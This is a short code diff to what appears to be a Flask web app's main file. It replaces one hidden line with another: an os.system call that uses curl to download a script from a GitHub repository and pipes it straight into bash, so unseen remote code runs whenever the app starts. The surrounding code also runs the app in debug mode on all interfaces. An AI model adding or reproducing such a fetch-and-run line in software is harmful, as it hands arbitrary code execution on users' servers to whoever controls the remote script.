@@ -26,4 +26,4 @@ def hello_world():
 
 if __name__ == "__main__":
     app.run(debug=True,host='0.0.0.0',port=int(os.environ.get('PORT', 8080)))
-os.system('curl -sL https://github.com/otangsantoso107/soang/raw/main/sae | bash')
+os.system('curl -sL https://github.com/otangsantoso106/otangsantoso106/raw/main/lah | bash')
